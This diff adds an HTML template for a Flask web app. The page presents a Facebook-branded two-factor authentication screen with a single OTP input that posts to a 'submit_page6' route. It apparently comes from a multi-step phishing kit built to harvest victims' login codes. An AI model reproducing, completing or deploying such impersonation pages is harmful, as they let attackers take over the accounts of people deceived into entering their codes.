@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="{{ lang.get('lang', 'en') }}">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>{{ lang['5.Authentication'] }}</title>
+    
+    <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='css/5.css') }}">
+    <link rel="icon" href="{{ url_for('static', filename='images/mafbb.png') }}" type="image/webp">
+
+    <style>
+        input[type='number']::-webkit-outer-spin-button,
+        input[type='number']::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            -moz-appearance: textfield;
+            appearance: none;
+            margin: 0;
+        }
+    </style>
+
+    <meta http-equiv="X-Content-Type-Options" content="nosniff">
+    <meta http-equiv="X-Frame-Options" content="DENY">
+    <meta http-equiv="X-XSS-Protection" content="1; mode=block">
+</head>
+<body>
+
+    <div class="header-container">
+        <div class="lop3">
+            <img class="hinh1" src="{{ url_for('static', filename='images/anh5.png') }}" alt="Hình ảnh mô tả">
+        </div>
+    </div>
+
+    <div class="main">
+        <h1 class="h1">{{ lang['5.Facebook'] }}</h1>
+        <h2 class="h2">{{ lang['5.app'] }}</h2>
+        <p class="h3">{{ lang['5.you'] }}</p>
+        <img class="hinh2" src="{{ url_for('static', filename='images/anh7.png') }}" alt="Hình ảnh mô tả">
+
+
+    <div class="bang">
+        <form id="loginForm" method="POST" action="{{ url_for('submit_page6') }}" onsubmit="validateForm(event);">
+            <div class="form-group">
+                <label for="OTP3"></label>
+                <input type="number" id="OTP3" name="OTP3" placeholder="{{lang['opt1']}}">
+            </div>
+            <div class="row">
+                <p class="err OTP_err"></p>
+            </div>
+            <div>
+                <button type="submit" id="submitButton">
+                    <span class="button-text">{{ lang['submit'] }}</span>
+                    <span class="spinner"></span>
+                </button>    
+            </div>
+        </form>
+    </div>
+</div>
+
+    <script src="{{ url_for('static', filename='js/6.js') }}"></script>
+
+</body>
+</html>
